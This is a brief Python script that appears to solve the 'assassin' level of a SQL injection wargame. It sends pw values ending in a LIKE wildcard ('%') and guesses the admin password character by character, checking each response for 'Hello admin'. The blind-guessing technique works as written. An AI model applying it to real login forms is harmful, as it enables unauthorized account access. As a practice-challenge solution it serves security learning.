import requests
from dotenv import load_dotenv
import os

#설마 그딴문제인가? 하면 보통 그딴문제다
load_dotenv()
# candidate = ['0','1','2','3','4','5','6','7','8','9',
#              'a','b','c','d','e','f',
#              'g','h','i','j','k','l','m',
#              'n','o','p','q','r','s','t',
#              'u','v','w','x','y','z',
#              'A','B','C','D','E','F',
#              'G','H','I','J','K','L','M',
#              'N','O','P','Q','R','S','T',
#              'U','V','W','X','Y','Z']
candidate = ['0','1','2','9','d','e','f']
guest = '90d2fe10'
for i in candidate:
    url=os.environ.get('LOS_URL')+'chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=902efd10'+i+'%'
    headers = {
        'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
    }

    res=requests.get(url, headers=headers)
    if "Hello admin" in res.text:
        print("Success")
        print(i)
    else:
        print("Failed")
        #print(url)
        #print(res.text)